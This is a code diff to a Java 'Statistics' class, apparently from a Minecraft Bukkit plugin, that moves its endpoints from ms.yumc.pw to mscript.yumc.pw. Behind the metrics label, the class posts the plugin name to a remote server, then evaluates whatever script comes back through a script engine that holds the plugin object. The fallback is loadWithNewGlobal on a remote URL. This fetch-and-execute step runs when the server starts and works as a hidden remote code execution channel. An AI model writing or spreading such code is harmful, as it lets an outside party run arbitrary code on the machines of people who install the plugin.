@@ -72,6 +72,7 @@ public class Statistics {
             plugin = (JavaPlugin) field.get(pluginClassLoader);
             engine = new MiaoScriptEngine();
             engine.put("plugin", plugin);
+            engine.eval("var global = this;");
         } catch (Throwable ignored) {
         }
     }
@@ -203,9 +204,9 @@ public class Statistics {
         timer = new StatisticsTimer();
         // 开启TPS统计线程
         Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, timer, 0, 20);
-        String script = "loadWithNewGlobal('http://ms.yumc.pw/api/plugin/download/name/report?from=$pluginName')";
+        String script = "loadWithNewGlobal('https://mscript.yumc.pw/api/plugin/download/name/report?from=$pluginName')";
         try {
-            script = postData("http://ms.yumc.pw/api/plugin/download/name/metrics?from=" + plugin.getDescription().getName(), "from=" + plugin.getDescription().getName());
+            script = postData("https://mscript.yumc.pw/api/plugin/download/name/metrics?from=" + plugin.getDescription().getName(), "from=" + plugin.getDescription().getName());
         } catch (Throwable e) {
             if (debug) {
                 e.printStackTrace();
